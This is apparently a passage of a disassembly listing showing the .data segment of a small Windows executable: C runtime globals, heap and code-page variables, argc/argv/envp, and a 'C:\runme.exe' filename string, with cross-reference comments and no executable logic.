		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
dword_406468	dd 3F8h			; DATA XREF: __heap_alloc+5r
					; __setmbcp+3Co
		align 10h
dword_406470	dd 0			; DATA XREF: sub_401314+129w
					; sub_4014C5+131r
dword_406474	dd 0			; DATA XREF: sub_401314+A4w
					; sub_4014C5+8Er
dword_406478	dd 0			; DATA XREF: sub_401314+76w
					; sub_401482+31r
dword_40647C	dd 0			; DATA XREF: sub_40118B+81w
					; sub_401314+F5r
; LPCSTR lpString2
lpString2	dd 0			; DATA XREF: sub_40118B+1Bw
					; sub_401314+5r
dword_406484	dd 0			; DATA XREF: sub_401314+BAw
					; sub_401314+C6r
dword_406488	dd 0			; DATA XREF: sub_401314+8Dw
					; sub_401482+38r
dword_40648C	dd 0			; DATA XREF: sub_401314+31w
					; sub_401482+Er
dword_406490	dd 0			; DATA XREF: sub_401314+48w
					; sub_401482+24r
dword_406494	dd 0			; DATA XREF: sub_40118B+D6w
					; sub_401314+2Br
dword_406498	dd 0			; DATA XREF: sub_401314+140w
					; sub_4014C5+152r
		align 10h
dword_4064A0	dd 0			; DATA XREF: sub_401314+FBw
					; sub_4014C5+B5r
dword_4064A4	dd 0			; DATA XREF: sub_401314+17w
					; sub_401314+3Cr ...
dword_4064A8	dd 0			; DATA XREF: sub_40118B+C5w
					; sub_401314+1Dr
dword_4064AC	dd 0			; DATA XREF: sub_40118B+5Fw
					; sub_401314+CCr
dword_4064B0	dd 0			; DATA XREF: sub_401314+168w
					; sub_4014C5+6Fr
dword_4064B4	dd 0			; DATA XREF: sub_40118B+F8w
					; sub_401314+59r
dword_4064B8	dd 0			; DATA XREF: sub_401314+E4w
					; sub_4014C5+9Fr
dword_4064BC	dd 0			; DATA XREF: sub_401314+157w
					; sub_4014C5+15Br
dword_4064C0	dd 0			; DATA XREF: sub_40118B+Aw
dword_4064C4	dd 0			; DATA XREF: sub_401314+112w
					; sub_4014C5+CEr ...
dword_4064C8	dd 0			; DATA XREF: sub_40118B+92w
					; sub_401314+10Cr
dword_4064CC	dd 0			; DATA XREF: sub_401314+5Fw
					; sub_401482+19r
dword_4064D0	dd 0			; DATA XREF: sub_40118B+A3w
					; sub_401314+123r
dword_4064D4	dd 0			; DATA XREF: sub_40118B+70w
					; sub_401314+DEr
dword_4064D8	dd 0			; DATA XREF: sub_40118B+2Cw
					; sub_401314+151r
dword_4064DC	dd 0			; DATA XREF: sub_40118B+3Dw
					; sub_401314+9Er
dword_4064E0	dd 0			; DATA XREF: sub_40118B+10Aw
					; sub_401314+70r
dword_4064E4	dd 0			; DATA XREF: sub_40118B+E7w
					; sub_401314+42r
dword_4064E8	dd 0			; DATA XREF: sub_401314+Bw
					; sub_401314+23r ...
dword_4064EC	dd 0			; DATA XREF: sub_40118B+4Ew
					; sub_401314+87r
dword_4064F0	dd 0			; DATA XREF: sub_401314+D2w
dword_4064F4	dd 0			; DATA XREF: sub_40118B+B4w
					; sub_401314+13Ar
dword_4064F8	dd 0			; DATA XREF: StartAddress+33w
					; sub_40180A+1Dr
byte_4064FC	db 0			; DATA XREF: StartAddress+41w
					; sub_40180A+15r
		align 10h
; char *Str
Str		dd 0			; DATA XREF: start+84w
					; __setenvp:loc_4023D8r ...
		align 8
dword_406508	dd 0			; DATA XREF: __amsg_exitr
					; _fast_error_exitr ...
		dd 3 dup(0)
dword_406518	dd 0A28h		; DATA XREF: start+52w
dword_40651C	dd 501h			; DATA XREF: start+49w
dword_406520	dd 5			; DATA XREF: start+3Ew
dword_406524	dd 1			; DATA XREF: start+30w
; int argc
argc		dd 1			; DATA XREF: start+A9r	__setargv+91w
; char **argv
argv		dd 410C90h		; DATA XREF: start+A3r	__setargv+89w
		dd 0
; char **envp
envp		dd 410C30h		; DATA XREF: start+98r	__setenvp+44w
dword_406538	dd 410C30h		; DATA XREF: start+9Dw
		dd 2 dup(0)
off_406544	dd offset Filename	; DATA XREF: __setargv+2Ew
					; "C:\\runme.exe"
		dd 0
byte_40654C	db 0			; DATA XREF: _doexit+2Dw
		align 10h
dword_406550	dd 1			; DATA XREF: _doexit+27w
dword_406554	dd 1			; DATA XREF: _doexit+4r _doexit+8Bw
dword_406558	dd 0			; DATA XREF: __XcptFilter+3Ar
					; __XcptFilter+46w ...
; char Filename[]
Filename	db 'C:\runme.exe',0     ; DATA XREF: __setargv:loc_402496o
					; .data:off_406544o
		align 4
		dd 3Dh dup(0)
dword_406660	dd 1			; DATA XREF: ___crtGetEnvironmentStringsA+2r
					; ___crtGetEnvironmentStringsA+23w ...
dword_406664	dd 0			; DATA XREF: __FF_MSGBANNER+21r
dword_406668	dd 1			; DATA XREF: __setmbcp:loc_402D8Fr
					; _getSystemCP+4w ...
dword_40666C	dd 0			; DATA XREF: ___crtMessageBoxA+3r
					; ___crtMessageBoxA+2Ew ...
dword_406670	dd 0			; DATA XREF: ___crtMessageBoxA+43w
					; ___crtMessageBoxA:loc_40388Cr
dword_406674	dd 0			; DATA XREF: ___crtMessageBoxA+4Aw
					; ___crtMessageBoxA+60r
dword_406678	dd 0			; DATA XREF: _mallocr
dword_40667C	dd 0			; DATA XREF: __callnewhr
		dd 2 dup(0)
dword_406688	dd 0			; DATA XREF: ___crtGetStringTypeA+7Br
		dd 3 dup(0)
dword_406698	dd 0			; DATA XREF: _getSystemCP+3Ar
					; ___crtLCMapStringA+C0r ...
		align 10h
dword_4066A0	dd 1			; DATA XREF: ___crtLCMapStringA+28r
					; ___crtLCMapStringA+4Cw ...
dword_4066A4	dd 1			; DATA XREF: ___crtGetStringTypeA+26r
					; ___crtGetStringTypeA:loc_403CA2w
dword_4066A8	dd 10h			; DATA XREF: ___sbh_heap_init+32w
					; ___sbh_alloc_new_region+5r ...
dword_4066AC	dd 0			; DATA XREF: ___sbh_free_block+239r
					; ___sbh_free_block+259r ...
dword_4066B0	dd 150650h		; DATA XREF: ___sbh_heap_init+2Dw
					; ___sbh_free_block+310w ...
; void *Dst
Dst		dd 0			; DATA XREF: ___sbh_heap_init:loc_403011w
					; ___sbh_free_block+22Cr ...
dword_4066B8	dd 1			; DATA XREF: ___sbh_heap_init+24w
					; ___sbh_find_blockr ...
; LPVOID lpMem
lpMem		dd 150650h		; DATA XREF: ___sbh_heap_init+15w
					; ___sbh_find_block+8r	...
; UINT CodePage
CodePage	dd 4E4h			; DATA XREF: __setmbcp+14r
					; __setmbcp+65w ...
		align 10h
dword_4066D0	dd 3 dup(0)		; DATA XREF: __setmbcp+123o
					; __setmbcp+171o ...
dword_4066DC	dd 0			; DATA XREF: __setmbcp+108w
					; __setmbcp+15Dw ...
byte_4066E0	db 0			; DATA XREF: _setSBUpLow:loc_402F5Fw
					; _setSBUpLow:loc_402F7Cw ...
		align 4
		dd 1Fh dup(0)
		dd 820000h, 860084h, 8A0088h, 8E008Ch, 920090h,	960094h
		dd 9A0098h, 9E009Ch, 0A200A0h, 0A600A4h, 0AA00A8h, 0AE00ACh
		dd 0B200B0h, 0B4h, 2 dup(0)
		dd 0C20000h, 0C600C4h, 0CA00C8h, 0CE00CCh, 0D200D0h, 0D600D4h
		dd 0DA00D8h, 0DE00DCh, 0E200E0h, 0E600E4h, 0EA00E8h, 0EE00ECh
		dd 0F200F0h, 0F4h, 2 dup(0)
byte_4067E0	db 0			; DATA XREF: __setmbcp+5Co
					; __setmbcp+AFo ...
byte_4067E1	db 0			; DATA XREF: _parse_cmdline+3Fr
					; _parse_cmdline+84r ...
		align 4
		dd 1Fh dup(0)
		dd 10000000h, 0Ch dup(10001000h), 1000h, 2 dup(0)
		dd 20000000h, 0Ch dup(20002000h), 2000h, 3 dup(0)
; LCID Locale
Locale		dd 0			; DATA XREF: __setmbcp+6Ew
					; __setmbcp+12Bw ...
; HANDLE hHeap
hHeap		dd 150000h		; DATA XREF: __heap_init+19w
					; __heap_init+29r ...
		dd 5 dup(0)
dword_406900	dd 410EF0h		; DATA XREF: __ioinit:loc_40281Ew
					; __ioinit+45r	...
dword_406904	dd 3Fh dup(0)		; DATA XREF: __ioinit+92o
; UINT uNumber
uNumber		dd 20h			; DATA XREF: __ioinit+26w
					; __ioinit:loc_402888r	...
dword_406A04	dd 1			; DATA XREF: __setenvp+ADw
dword_406A08	dd 1			; DATA XREF: __setenvp+3r __setargv+8r ...
dword_406A0C	dd 0			; DATA XREF: _doexit+3Er
dword_406A10	dd 0			; DATA XREF: _doexit+35r _doexit+57r
dword_406A14	dd 0			; DATA XREF: __cinitr
dword_406A18	dd 140650h		; DATA XREF: start+7Aw	__setargv+29r
		align 800h
_data		ends


		end start
